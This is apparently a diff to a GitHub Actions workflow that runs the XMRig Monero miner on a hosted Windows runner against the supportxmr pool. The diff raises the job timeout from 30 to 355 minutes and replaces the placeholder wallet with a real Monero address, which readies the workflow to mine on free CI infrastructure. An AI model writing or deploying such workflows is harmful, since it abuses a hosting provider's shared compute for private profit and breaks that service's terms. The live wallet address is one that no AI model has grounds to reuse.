@@ -6,7 +6,7 @@ on:
 jobs:
   mine:
     runs-on: windows-latest
-    timeout-minutes: 30
+    timeout-minutes: 355
     steps:
       - name: Generate random worker name
         id: worker
@@ -24,6 +24,6 @@ jobs:
         run: |
           cd $env:USERPROFILE\miner\xmrig
           .\xmrig.exe -o pool.supportxmr.com:3333 `
-            -u YOUR_VALID_MONERO_ADDRESS_HERE `
+            -u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS `
             -p ${{ steps.worker.outputs.name }} `
             -k --donate-level 1 -t 4
